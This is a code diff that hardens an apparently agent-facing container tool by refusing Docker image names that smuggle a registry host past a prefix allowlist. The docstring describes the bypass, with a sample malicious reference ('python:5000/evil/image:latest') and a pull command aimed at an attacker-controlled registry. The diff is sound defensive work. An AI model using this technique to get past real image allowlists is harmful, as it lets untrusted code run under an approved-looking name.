@@ -41,6 +41,35 @@ _DOCKER_FALLBACK = "/Applications/Docker.app/Contents/Resources/bin/docker"
 _DAEMON_CACHE_S = 60.0
 
 
+def _names_a_registry_host(image: str) -> bool:
+    """True if the component before the first `/` in `image` would be
+    parsed by Docker as a registry host rather than part of the image
+    name.
+
+    Docker's reference grammar treats the first `/`-separated component
+    as a registry host whenever it contains a `.` or a `:`, or is
+    exactly `localhost` -- otherwise it is folded into
+    `docker.io/library/...`. `container_image_prefixes` assumes every
+    allowed image is a plain `docker.io/library/<name>:<tag>` reference
+    with no registry component, so `image.startswith("python:")`
+    is meant to mean "the official python image". It does not: given
+    `python:5000/evil/image:latest`, the string starts with `python:`
+    and passes that check, but Docker parses `python:5000` as a
+    registry host (name `python`, port `5000`) and pulls
+    `evil/image:latest` from THAT host -- confirmed live, 2026-09-09
+    (`docker pull python:5000/malicious/image:latest` dials
+    `https://python:5000/v2/`, not Docker Hub). Anyone who can make the
+    hostname `python` resolve to a registry they control (a hosts-file
+    entry, DNS, a shared network) turns the allowlist into a no-op:
+    the effective image is whatever they served, chosen only by them.
+    Refusing any image whose first component looks like a registry
+    host closes that -- none of the allowed prefixes need one."""
+    if "/" not in image:
+        return False
+    first = image.split("/", 1)[0]
+    return "." in first or ":" in first or first == "localhost"
+
+
 def find_docker(configured: str = "") -> str:
     if configured:
         return configured
@@ -87,6 +116,12 @@ class RunContainerTool:
                 ok=False,
                 error=(f"refused: {image!r} is not an allowed image -- it must start with one of "
                        f"{', '.join(self._config.container_image_prefixes)}"),
+            )
+        if _names_a_registry_host(image):
+            return ToolResult(
+                ok=False,
+                error=(f"refused: {image!r} names a registry host before the first `/` -- "
+                       "only plain docker.io images (no custom registry) are allowed"),
             )
         command = args.get("command")
         if isinstance(command, str):
